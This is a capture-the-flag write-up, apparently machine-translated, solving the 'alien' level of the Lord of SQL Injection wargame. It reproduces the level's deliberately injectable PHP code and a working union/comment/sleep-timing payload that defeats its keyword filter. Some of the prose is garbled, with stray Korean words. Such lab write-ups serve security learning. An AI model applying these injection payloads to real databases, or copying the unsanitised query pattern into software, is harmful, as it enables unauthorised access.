@@ -1,0 +1,123 @@
+https://mingzz1.github.io//wargame/lord of sql injection/2018/09/19/los-alien.html
+
+The code is as follows:
+
+-------------------------------------------------------------
+query : select id from prob_alien where no=
+-------------------------------------------------------------
+
+-------------------------------------------------------------
+query2 : select id from prob_alien where no=''
+-------------------------------------------------------------
+
+<?php
+  include "./config.php";
+  login_chk();
+  dbconnect();
+  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
+  $query = "select id from prob_alien where no={$_GET[no]}";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
+  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
+  if($_GET['no']){
+    $r = mysql_fetch_array(mysql_query($query));
+    if($r['id'] !== "admin") exit("sandbox1");
+    $r = mysql_fetch_array(mysql_query($query));
+    if($r['id'] === "admin") exit("sandbox2");
+    $r = mysql_fetch_array(mysql_query($query2));
+    if($r['id'] === "admin") exit("sandbox");
+    $r = mysql_fetch_array(mysql_query($query2));
+    if($r['id'] === "admin") solve("alien");
+  }
+  highlight_file(__FILE__);
+?>
+
+POXXThere seems to be a similar problem with something in the past, but I can't remember it well.
+
+Write-upIt seems to be somewhere, but I can't find it.
+
+In order to solve the problem, you have 조건문to go through a total of 4 passes.
+
+    result !== “admin”: If the result value is not admin, exit => admin
+    result === “admin”: If the result value is admin, exit => should not be admin
+    result === “admin”: If the result value is admin, exit => should not be admin
+    result === “admin”: If the result value is admin, it should be solve => admin
+
+# 1 and # 2 noon 싱글쿼터but is, in the four times and three times the condition 싱글쿼터exists.
+
+It is easier than you think to get the value you want by bypassing when and when there is no single quota.
+
+?no=1 union select 1#' union select '1
+
+When entered as above, the $queryand completed are $query2as follows.
+
+$query1 : select id from prob_alien where no=1 union select 1#' union select '1
+
+$query2 : select id from prob_alien where no='1 union select 1#' union select '1'
+
+In the case of the first query, since #is commented out, #subsequent ' union select '1is not checked.
+
+On the other hand, in the second query, since 1 union select 1#until is noentered as the value of, #subsequent union select '1'is executed.
+
+I figured it out so easily, but the problem was that I had to create a query statement that adminsometimes should be and sometimes should adminnot be with one query statement.
+
+I was able to solve this by asking around, but I could just 시간use.
+
+?no=1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#
+
+First, the first query is as follows.
+
+!sleep(1)&&now()%2=1Returns 0or according to the current time 1.
+
+After this, it hex(10 + 0 OR 1)becomes, at this time, it becomes hex(10)silver Aand hex(11)silver B.
+
+This lower()is converted to lowercase letters concat()through 0x646d696eand then combined with through .
+
+0x646d696eIs dminso, the final result value according to a time adminor bdminwill be.
+
+sleep(1)0When I run the query for the second time immediately after the first is, I made it 1to come out.
+
+In the second query, I hex(10+did not hex(9+.
+
+Looking at the result values ​​that should be displayed, they are in order hex(10) -> hex(11) -> hex(11) -> hex(10).
+
+However, if you continue sleep(1)to run, hex(10) -> hex(11) -> hex(10) -> hex(11)or hex(11) -> hex(10) -> hex(11) -> hex(10)is unconditionally .
+
+It hex(10)only needs to come out here correctly, and hex(11)since it does not matter if a different value comes out , in the second query, hex(9+I changed to hex(10) -> hex(11) -> hex(9) -> hex(10)to get
+
+Then, the results that come out will be in order and you admin -> bdmin -> 9dmin -> admincan solve the problem.
+
+However, the adminproblem is not solved at once, as it must be the time when the query is executed for the first time.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+query : select id from prob_alien where no=1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+query2 : select id from prob_alien where no='1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#'
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ALIEN Clear!
+<?php
+  include "./config.php";
+  login_chk();
+  dbconnect();
+  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
+  $query = "select id from prob_alien where no={$_GET[no]}";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
+  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
+  if($_GET['no']){
+    $r = mysql_fetch_array(mysql_query($query));
+    if($r['id'] !== "admin") exit("sandbox1");
+    $r = mysql_fetch_array(mysql_query($query));
+    if($r['id'] === "admin") exit("sandbox2");
+    $r = mysql_fetch_array(mysql_query($query2));
+    if($r['id'] === "admin") exit("sandbox");
+    $r = mysql_fetch_array(mysql_query($query2));
+    if($r['id'] === "admin") solve("alien");
+  }
+  highlight_file(__FILE__);
+?>
+
+
